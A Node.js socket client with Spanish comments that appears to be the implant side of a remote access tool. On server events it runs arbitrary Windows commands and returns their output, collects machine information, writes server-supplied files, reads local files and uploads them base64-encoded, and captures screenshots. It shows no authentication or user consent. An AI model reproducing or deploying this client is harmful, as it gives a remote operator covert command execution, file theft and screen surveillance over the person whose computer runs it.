const clase = require('./funciones')
const path = require('path');
const funciones = new clase();

class SocketController {
    constructor(socket) {
        this.socket = socket;
        this.registerEventHandlers();
    }

    registerEventHandlers() {

        //cuando se conecta al servidor
        this.socket.on('connect', () => {
            console.log(`Conectado al servidor`);
        });


        //recibe comando del servidor
        this.socket.on('recibirInstruccion', (mensaje) => {
            console.log('Mensaje nuevo recibido:', mensaje);
            //ejecutamos el comando
            funciones.ejecutarComandoWindows(mensaje.instruccion)
                .then(resultado => {
                    //enviamos el resultado
                    this.socket.emit('respuestaComando', resultado);
                })
                .catch(error => {
                    this.socket.emit('respuestaComando', `Error: ${error}`);
                });
        });

        //datos del cliente
        this.socket.on('solicitarInfoCliente', async () => {
            try {
                let datos = await funciones.obtenerDatosCliente();
                this.socket.emit('obtenerInformacionCliente', datos);
            } catch (error) {
                console.error('Error al obtener datos del cliente:', error);
                //this.socket.emit('respuesta', { error: 'Error al obtener datos del cliente' });
            }
        });


        //crear archivo
        this.socket.on('crearArchivo', async (datos) => {
            console.log("crear archivo")
            try {
                let respuesta = await funciones.crearArchivo(datos.nombre, datos.contenido);
                this.socket.emit('respuestaCrearArchivo', respuesta);
            } catch (error) {
                console.error('error al crear archivo:', error);
            }
        });

        //recibir archivo
        this.socket.on('recibirArchivoServidor', async (datos) => {
            console.log("recibir archivo")
            try {

                let respuesta = await funciones.reconstruirArchivo(datos)
                console.log(respuesta)
                this.socket.emit('respuestaArchivoEnviado', respuesta);//enviamos respuesta

            } catch (error) {
                console.error('error al crear archivo:', error);
            }
        });


        //recibir instruccion de enviar archivo al servidor
        this.socket.on('recuperarArchivo', async (datos) => {
            try {
                console.log('recuperar archivo')
                const data = await funciones.leerArchivo(datos);
                const base64Data = data.toString('base64');

                const nombreArchivo = path.basename(datos);

                console.log('enviando archivo')
                this.socket.emit('recibirArchivoCliente', {
                    nombre: nombreArchivo,
                    contenido: base64Data
                });

            } catch (error) {
                console.error('Error al leer el archivo:', error);
                // Enviar un mensaje de error al servidor
                this.socket.emit('errorLecturaArchivo', error.message);
            }
        });


        //recibir instruccion para captura de pantalla
        this.socket.on('captura_pantalla', async (datos) => {
            console.log("captura de pantalla",datos)
            try {
                if (datos.opcion == "LOCAL") {
                    let respuesta = await funciones.capturaPantalla(datos);
                    this.socket.emit('errorCapturaPantalla', respuesta);
                } else {
                    let img = await funciones.capturaPantalla(datos);
                    this.socket.emit('recuperarCaptura', { img });
                }

            } catch (error) {
                console.error(error);
                this.socket.emit('errorCapturaPantalla', error.message);
            }
        });


        // Controlar desconexión del servidor
        this.socket.on('disconnect', () => {
            console.log('Desconectado del servidor');
        });

        // Puedes agregar más manejadores de eventos aquí
    }
}

module.exports = SocketController;
